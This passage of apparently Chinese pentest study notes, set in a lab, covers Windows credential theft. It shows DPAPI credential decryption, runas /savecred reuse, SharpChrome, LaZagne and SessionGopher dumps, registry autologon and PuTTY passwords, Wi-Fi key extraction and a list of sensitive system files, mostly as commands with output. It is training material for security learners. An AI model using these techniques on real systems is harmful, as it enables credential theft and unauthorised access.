class="string">&quot;Default Web Site&quot;</span></span><br><span class="line">wevtutil qe Application <span class="string">&quot;/q:*[Application [(EventID=3005)]]&quot;</span> /f:text /<span class="built_in">rd</span>:true /u:WEB02\administrator /p:<span class="number">5</span>erv3rAdmin! /<span class="built_in">r</span>:WEB02</span><br></pre></td></tr></table></figure><h3 id="PowerShell-凭据"><a href="#PowerShell-凭据" class="headerlink" title="PowerShell 凭据"></a>PowerShell 凭据</h3><p>PowerShell 凭据通常用于脚本和自动化任务，以便于存储加密凭据。凭据使用<a href="https://en.wikipedia.org/wiki/Data_Protection_API">DPAPI</a>进行保护，这通常意味着它们只能由创建它们的同一台计算机上的同一用户解密。</p><p>例如，以下脚本<code>Connect-VC.ps1</code>是系统管理员创建的，以便轻松连接到 vCenter 服务器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Connect-VC.ps1</span></span><br><span class="line"><span class="comment"># Get-Credential | Export-Clixml -Path &#x27;C:\scripts\pass.xml&#x27;</span></span><br><span class="line"><span class="variable">$encryptedPassword</span> = <span class="built_in">Import-Clixml</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\scripts\pass.xml&#x27;</span></span><br><span class="line"><span class="variable">$decryptedPassword</span> = <span class="variable">$encryptedPassword</span>.GetNetworkCredential().Password</span><br><span class="line"><span class="built_in">Connect-VIServer</span> <span class="literal">-Server</span> <span class="string">&#x27;VC-01&#x27;</span> <span class="literal">-User</span> <span class="string">&#x27;bob_adm&#x27;</span> <span class="literal">-Password</span> <span class="variable">$decryptedPassword</span></span><br></pre></td></tr></table></figure><p>解密 PowerShell 凭据，如果获得了该用户上下文中的命令执行权限，或者可以滥用 DPAPI，那么可以从<code>encrypted.xml</code>中恢复明文凭证。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$credential</span> = <span class="built_in">Import-Clixml</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\scripts\pass.xml&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$credential</span>.GetNetworkCredential().username</span><br><span class="line"></span><br><span class="line">bob</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$credential</span>.GetNetworkCredential().password</span><br><span class="line"></span><br><span class="line">Str0ng3ncryptedP@ss!</span><br></pre></td></tr></table></figure><h2 id="Other-Files"><a href="#Other-Files" class="headerlink" title="Other Files"></a>Other Files</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%SYSTEMDRIVE%\pagefile.sys</span><br><span class="line">%WINDIR%\debug\NetSetup.log</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\iis6.log</span><br><span class="line">%WINDIR%\system32\config\AppEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br><span class="line">%WINDIR%\system32\CCM\logs\*.log</span><br><span class="line">%USERPROFILE%\ntuser.dat</span><br><span class="line">%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat</span><br><span class="line">%WINDIR%\System32\drivers\etc\hosts</span><br><span class="line">C:\ProgramData\Configs\*</span><br><span class="line">C:\Program Files\Windows PowerShell\*</span><br></pre></td></tr></table></figure><hr><h1 id="Credential-Theft"><a href="#Credential-Theft" class="headerlink" title="Credential Theft"></a>Credential Theft</h1><h2 id="Cmdkey-Saved-Credentials"><a href="#Cmdkey-Saved-Credentials" class="headerlink" title="Cmdkey Saved Credentials"></a>Cmdkey Saved Credentials</h2><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey">cmdkey</a>命令可用于创建、列出和删除已存储的用户名和密码。用户可能希望存储特定主机的凭据，或使用它来存储终端服务连接的凭据，以便使用远程桌面连接到远程主机而无需输入密码。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">cmdkey</span> /<span class="title">list</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">Target</span>: <span class="title">LegacyGeneric:target</span>=<span class="title">TERMSRV</span>/<span class="title">SQL01</span></span></span><br><span class="line"><span class="function">    <span class="title">Type</span>: <span class="title">Generic</span></span></span><br><span class="line"><span class="function">    <span class="title">User</span>: <span class="title">inlanefreight</span>\<span class="title">bob</span></span></span><br></pre></td></tr></table></figure><p>尝试通过 RDP 连接到主机时，将使用保存的凭据。</p><p>重用凭据，以该用户的身份向自己发送反向 shell，或者运行二进制文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; runas /savecred /user:inlanefreight\bob <span class="string">&quot;COMMAND HERE&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Browser-Credentials"><a href="#Browser-Credentials" class="headerlink" title="Browser Credentials"></a>Browser Credentials</h2><p>用户通常会在浏览器中存储经常访问的应用程序的凭据。可以使用<a href="https://github.com/GhostPack/SharpDPAPI">SharpChrome</a>等工具从 Google Chrome 中检索 cookie 和已保存的登录信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpChrome.exe logins /unprotect</span><br><span class="line"></span><br><span class="line">  __                 _</span><br><span class="line"> (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _</span><br><span class="line"> __) | | (_| |  |_) \_ | | | (_) | | | (/_</span><br><span class="line">                |</span><br><span class="line">  v1.<span class="number">7.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Chrome Saved Logins Triage</span><br><span class="line"></span><br><span class="line">[*] Triaging Chrome Logins <span class="keyword">for</span> current user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State</span><br><span class="line">[*] AES state key      : <span class="number">5</span>A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="literal">---</span> Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login <span class="keyword">Data</span>) <span class="literal">---</span></span><br><span class="line"></span><br><span class="line">file_path,signon_realm,origin_url,date_created,times_used,username,password</span><br><span class="line">C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login <span class="keyword">Data</span>,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,<span class="number">4</span>/<span class="number">12</span>/<span class="number">2021</span> <span class="number">5</span>:<span class="number">16</span>:<span class="number">52</span> PM,<span class="number">13262735812597100</span>,bob@inlanefreight.local,Welcome1</span><br></pre></td></tr></table></figure><h2 id="Password-Managers"><a href="#Password-Managers" class="headerlink" title="Password Managers"></a>Password Managers</h2><p>密码管理器可能是桌面应用程序（例如<code>KeePass</code>）、云解决方案（例如<code>1Password</code>）或企业密码库（例如<code>Thycotic</code>或<code>CyberArk</code>）。获取密码管理器的访问权限（尤其是 IT 人员或整个部门使用的密码管理器）可能导致以管理员级别访问高价值目标（例如网络设备、服务器、数据库等）。</p><h2 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h2><p>如果以具有 Microsoft Exchange 收件箱的域用户身份访问已加入域的系统，可以尝试使用<a href="https://github.com/dafthack/MailSniper">MailSniper</a>工具在用户的电子邮件中搜索“pass”、“creds”、“credentials”等术语。</p><h2 id="Automation-tools"><a href="#Automation-tools" class="headerlink" title="Automation tools"></a>Automation tools</h2><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>工具，尝试从 Web 浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具和内部密码存储机制（即 Autologon、Credman、DPAPI、LSA 机密等）。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\lazagne.exe all</span><br><span class="line"></span><br><span class="line">|====================================================================|</span><br><span class="line">|                                                                    |</span><br><span class="line">|                        The LaZagne Project                         |</span><br><span class="line">|                                                                    |</span><br><span class="line">|                          ! BANG BANG !                             |</span><br><span class="line">|                                                                    |</span><br><span class="line">|====================================================================|</span><br><span class="line"></span><br><span class="line"><span class="comment">########## User: jordan ##########</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------</span> Winscp passwords <span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">URL: transfer.inlanefreight.local</span><br><span class="line">Login: root</span><br><span class="line">Password: Summer2020!</span><br><span class="line">Port: <span class="number">22</span></span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------</span> Credman passwords <span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">URL: dev01.dev.inlanefreight.local</span><br><span class="line">Login: jordan_adm</span><br><span class="line">Password: ! Q A Z z a q <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[+] <span class="number">2</span> passwords have been found.</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information launch it again with the <span class="literal">-v</span> option</span><br><span class="line"></span><br><span class="line">elapsed time = <span class="number">5.50499987602</span></span><br></pre></td></tr></table></figure><h3 id="SessionGopher"><a href="#SessionGopher" class="headerlink" title="SessionGopher"></a>SessionGopher</h3><p><a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a>提取已保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭据。</p><p>需要本地管理员访问权限来检索<code>HKEY_USERS</code>中每个用户的存储会话信息，但始终值得以当前用户身份运行以查看是否可以找到任何有用的凭据。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SessionGopher.ps1</span><br><span class="line"> </span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Invoke-SessionGopher</span> <span class="literal">-Target</span> WINLPE<span class="literal">-SRV01</span></span><br><span class="line"> </span><br><span class="line">          o_</span><br><span class="line">         /  <span class="string">&quot;.   SessionGopher</span></span><br><span class="line"><span class="string">       ,&quot;</span>  _-<span class="string">&quot;</span></span><br><span class="line"><span class="string">     ,&quot;</span>   m m</span><br><span class="line">  ..+     )      Brandon Arvanaghi</span><br><span class="line">     `m..m       Twitter: @arvanaghi | arvanaghi.com</span><br><span class="line"> </span><br><span class="line">[+] Digging on WINLPE<span class="literal">-SRV01</span>...</span><br><span class="line">WinSCP Sessions</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Source   : WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br><span class="line">Session  : Default%<span class="number">20</span>Settings</span><br><span class="line">Hostname :</span><br><span class="line">Username :</span><br><span class="line">Password :</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">PuTTY Sessions</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Source   : WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br><span class="line">Session  : nix03</span><br><span class="line">Hostname : nix03.inlanefreight.local</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">SuperPuTTY Sessions</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Source        : WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br><span class="line">SessionId     : NIX03</span><br><span class="line">SessionName   : NIX03</span><br><span class="line">Host          : nix03.inlanefreight.local</span><br><span class="line">Username      : srvadmin</span><br><span class="line">ExtraArgs     :</span><br><span class="line">Port          : <span class="number">22</span></span><br><span class="line">Putty Session : Default Settings</span><br></pre></td></tr></table></figure><h2 id="Clear-Text-Password-Storage-in-the-Registry"><a href="#Clear-Text-Password-Storage-in-the-Registry" class="headerlink" title="Clear-Text Password Storage in the Registry"></a>Clear-Text Password Storage in the Registry</h2><p>某些程序和 Windows 配置可能会导致明文密码或其他数据存储在注册表中。虽然<code>Lazagne</code>和<code>SessionGopher</code>等工具是提取凭据的好方法，但也应该熟悉并习惯手动枚举它们。</p><h3 id="枚举-Autologon"><a href="#枚举-Autologon" class="headerlink" title="枚举 Autologon"></a>枚举 Autologon</h3><p>自动登录帐户的典型配置涉及手动设置以下注册表项：</p><ul><li><code>AdminAutoLogon</code>- 确定自动登录是否启用或禁用。值为“1”表示已启用。</li><li><code>DefaultUserName</code>- 保存将自动登录的帐户的用户名的值。</li><li><code>DefaultPassword</code>- 保存先前指定的用户帐户的密码值。</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">reg</span> <span class="title">query</span> &quot;<span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SOFTWARE</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span> <span class="title">NT</span>\<span class="title">CurrentVersion</span>\<span class="title">Winlogon</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SOFTWARE</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span> <span class="title">NT</span>\<span class="title">CurrentVersion</span>\<span class="title">Winlogon</span></span></span><br><span class="line"><span class="function">    <span class="title">AutoRestartShell</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function">    <span class="title">Background</span>    <span class="title">REG_SZ</span>    0 0 0</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    &lt;<span class="title">SNIP</span>&gt;</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">AutoAdminLogon</span>    <span class="title">REG_SZ</span>    1</span></span><br><span class="line"><span class="function">    <span class="title">DefaultUserName</span>    <span class="title">REG_SZ</span>    \<span class="title">htb</span>-<span class="title">student</span></span></span><br><span class="line"><span class="function">    <span class="title">DefaultPassword</span>    <span class="title">REG_SZ</span>    \<span class="title">_</span>@<span class="title">cademy_stdnt</span>!</span></span><br></pre></td></tr></table></figure><h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</span><br></pre></td></tr></table></figure><p>此特定注册表项的访问控制与配置和保存会话的用户帐户绑定。因此，为了查看它，需要以该用户身份登录并搜索<code>HKEY_CURRENT_USER</code>配置单元。随后，如果具有管理员权限，将能够在 中相应用户的配置单元下找到它<code>HKEY_USERS</code>。</p><p>枚举可用的已保存会话</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%<span class="number">20</span>ssh</span><br></pre></td></tr></table></figure><p>查看发现的会话 <code>kali%20ssh</code>的键和值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%<span class="number">20</span>ssh</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%<span class="number">20</span>ssh</span><br><span class="line">    Present    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    HostName    REG_SZ</span><br><span class="line">    LogFileName    REG_SZ    putty.log</span><br><span class="line">    </span><br><span class="line">  &lt;SNIP&gt;</span><br><span class="line">  </span><br><span class="line">    ProxyDNS    REG_DWORD    <span class="number">0</span>x1</span><br><span class="line">    ProxyLocalhost    REG_DWORD    <span class="number">0</span>x0</span><br><span class="line">    ProxyMethod    REG_DWORD    <span class="number">0</span>x5</span><br><span class="line">    ProxyHost    REG_SZ    proxy</span><br><span class="line">    ProxyPort    REG_DWORD    <span class="number">0</span>x50</span><br><span class="line">    ProxyUsername    REG_SZ    administrator</span><br><span class="line">    ProxyPassword    REG_SZ    <span class="number">1</span>_4m_th3_@cademy_4dm1n!</span><br></pre></td></tr></table></figure><h2 id="Wifi-Passwords"><a href="#Wifi-Passwords" class="headerlink" title="Wifi Passwords"></a>Wifi Passwords</h2><p>如果获得具有无线网卡的用户工作站的本地管理员访问权限，就可以列出他们最近连接的任何无线网络。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netsh</span> <span class="title">wlan</span> <span class="title">show</span> <span class="title">profile</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Profiles</span> <span class="title">on</span> <span class="title">interface</span> <span class="title">Wi</span>-<span class="title">Fi</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">policy</span> <span class="title">profiles</span> (<span class="title">read</span> <span class="title">only</span>)</span></span><br><span class="line"><span class="function">--------------------------------</span></span><br><span class="line"><span class="function">    &lt;<span class="title">None</span>&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">profiles</span></span></span><br><span class="line"><span class="function">------------</span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">Smith</span> <span class="title">Cabin</span></span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">Bob</span>&#x27;<span class="title">s</span> <span class="title">iPhone</span></span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">EE_Guest</span></span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">EE_Guest</span> 2.4</span></span><br><span class="line"><span class="function">    <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span>     : <span class="title">ilfreight_corp</span></span></span><br></pre></td></tr></table></figure><p>检索已保存的无线密码，根据网络配置，可以检索预共享密钥（<code>Key Content</code>见下文）并可能访问目标网络。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netsh</span> <span class="title">wlan</span> <span class="title">show</span> <span class="title">profile</span> <span class="title">ilfreight_corp</span> <span class="title">key</span>=<span class="title">clear</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Profile</span> <span class="title">ilfreight_corp</span> <span class="title">on</span> <span class="title">interface</span> <span class="title">Wi</span>-<span class="title">Fi</span>:</span></span><br><span class="line"><span class="function">=======================================================================</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Applied</span>: <span class="title">All</span> <span class="title">User</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Profile</span> <span class="title">information</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Version</span>                : 1</span></span><br><span class="line"><span class="function">    <span class="title">Type</span>                   : <span class="title">Wireless</span> <span class="title">LAN</span></span></span><br><span class="line"><span class="function">    <span class="title">Name</span>                   : <span class="title">ilfreight_corp</span></span></span><br><span class="line"><span class="function">    <span class="title">Control</span> <span class="title">options</span>        :</span></span><br><span class="line"><span class="function">        <span class="title">Connection</span> <span class="title">mode</span>    : <span class="title">Connect</span> <span class="title">automatically</span></span></span><br><span class="line"><span class="function">        <span class="title">Network</span> <span class="title">broadcast</span>  : <span class="title">Connect</span> <span class="title">only</span> <span class="title">if</span> <span class="title">this</span> <span class="title">network</span> <span class="title">is</span> <span class="title">broadcasting</span></span></span><br><span class="line"><span class="function">        <span class="title">AutoSwitch</span>         : <span class="title">Do</span> <span class="title">not</span> <span class="title">switch</span> <span class="title">to</span> <span class="title">other</span> <span class="title">networks</span></span></span><br><span class="line"><span class="function">        <span class="title">MAC</span> <span class="title">Randomization</span>  : <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Connectivity</span> <span class="title">settings</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Number</span> <span class="title">of</span> <span class="title">SSIDs</span>        : 1</span></span><br><span class="line"><span class="function">    <span class="title">SSID</span> <span class="title">name</span>              : &quot;<span class="title">ilfreight_corp</span>&quot;</span></span><br><span class="line"><span class="function">    <span class="title">Network</span> <span class="title">type</span>           : <span class="title">Infrastructure</span></span></span><br><span class="line"><span class="function">    <span class="title">Radio</span> <span class="title">type</span>             : [ <span class="title">Any</span> <span class="title">Radio</span> <span class="title">Type</span> ]</span></span><br><span class="line"><span class="function">    <span class="title">Vendor</span> <span class="title">extension</span>       : <span class="title">Not</span> <span class="title">present</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Security</span> <span class="title">settings</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Authentication</span>         : <span class="title">WPA2</span>-<span class="title">Personal</span></span></span><br><span class="line"><span class="function">    <span class="title">Cipher</span>                 : <span class="title">CCMP</span></span></span><br><span class="line"><span class="function">    <span class="title">Authentication</span>         : <span class="title">WPA2</span>-<span class="title">Personal</span></span></span><br><span class="line"><span class="function">    <span class="title">Cipher</span>                 : <span class="title">GCMP</span></span></span><br><span class="line"><span class="function">    <span class="title">Security</span> <span class="title">key</span>           : <span class="title">Present</span></span></span><br><span class="line"><span class="function">    <span class="title">Key</span> <span class="title">Content</span>            : <span class="title">ILFREIGHTWIFI</span>-<span class="title">CORP123908</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Cost</span> <span class="title">settings</span></span></span><br><span class="line"><span class="function">--------------------</span></span><br><span class="line"><span class="function">    <span class="title">Cost</span>                   : <span class="title">Unrestricted</span></span></span><br><span class="line"><span class="function">    <span class="title">Congested</span>              : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Approaching</span> <span class="title">Data</span> <span class="title">Limit</span> : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Over</span> <span class="title">Data</span> <span class="title">Limit</span>        : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Roaming</span>                : <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">Cost</span> <span class="title">Source</span>            : <span class="title">Default</span></span></span><br></pre></td></tr></table></figure><hr><h1 id="Citrix-Breakout"><a href="#Citrix-Breakout" class="headerlink" title="Citrix Breakout"></a>Citrix Breakout</h1><p>许多组织利用虚拟化平台（如终端服务、Citrix、AWS AppStream、CyberArk PSM 和 Kiosk）提供远程访问解决方案，以满足其业务需求。然而，大多数组织在其桌面环境中实施了”锁定”措施，以最大限度地减少恶意员工和受感染帐户对整个域安全的潜在影响。虽然这些桌面限制可以阻止威胁行为者，但他们仍有可能”突破”受限环境。</p><p>突破的基本方法：</p><ol><li>获得<code>Dialog Box</code>的访问权限。</li><li>利用对话框来实现<code>command execution</code>。</li><li><code>Escalate privileges</code>以获得更高级别的访问权限。</li></ol><p>使用生成的目标的 RDP 会话访问 <a href="http://humongousretail.com/remote/%EF%BC%8C%E5%B9%B6%E4%BD%BF%E7%94%A8%E4%B8%8B%E9%9D%A2%E6%8F%90%E4%BE%9B%E7%9A%84%E5%87%AD%E6%8D%AE%E7%99%BB%E5%BD%95%E3%80%82%E7%99%BB%E5%BD%95%E5%90%8E%EF%BC%8C%E5%8D%95%E5%87%BB%E9%BB%98%E8%AE%A4%E6%A1%8C%E9%9D%A2%E4%BB%A5%E8%8E%B7%E5%8F%96">http://humongousretail.com/remote/，并使用下面提供的凭据登录。登录后，单击默认桌面以获取</a> Citrix launch.ica 文件以连接到受限环境。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 